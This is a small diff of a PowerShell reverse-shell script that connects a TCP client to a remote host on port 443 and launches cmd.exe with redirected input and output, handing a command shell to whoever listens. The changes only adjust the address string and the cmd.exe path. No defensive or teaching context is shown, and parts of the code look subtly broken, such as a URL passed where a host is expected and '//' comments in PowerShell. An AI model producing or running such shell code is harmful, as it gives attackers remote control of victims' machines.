@@ -3,7 +3,7 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 // Setup IPADDR
-$address = 'http://demo.testfire.net'
+$address = 'http://demo.testfire.net/'
 // Setup PORT
 $port = '443'
 $client = New-Object system.net.sockets.tcpclient
@@ -11,7 +11,7 @@ $client.connect($address,$port)
 $stream = $client.GetStream()
 $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
 $process = New-Object System.Diagnostics.Process
-$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.FileName = 'C:\windows\system32\cmd.exe'
 $process.StartInfo.RedirectStandardInput = 1
 $process.StartInfo.RedirectStandardOutput = 1
 $process.StartInfo.UseShellExecute = 0
